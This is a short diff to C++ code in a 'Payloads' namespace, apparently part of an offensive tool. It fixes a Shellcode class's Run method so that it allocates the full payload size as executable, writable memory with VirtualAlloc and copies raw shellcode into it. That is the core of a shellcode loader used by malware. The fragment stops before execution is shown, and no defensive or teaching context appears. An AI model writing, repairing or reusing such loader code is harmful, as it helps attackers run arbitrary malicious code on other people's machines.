@@ -4,12 +4,12 @@
 namespace Payloads {
     class Shellcode : Payload {
     public:
-        int payload_bits;
+        int payload_size;
 
         Shellcode() : Payload() {}
 
         void Run(uint8_t * p, int n) {
-            LPVOID ptr = VirtualAlloc(0, n / 8, 0x3000, 0x40);
+            LPVOID ptr = VirtualAlloc(0, n, 0x3000, 0x40);
             RtlMoveMemory(ptr, p, n);
 
 
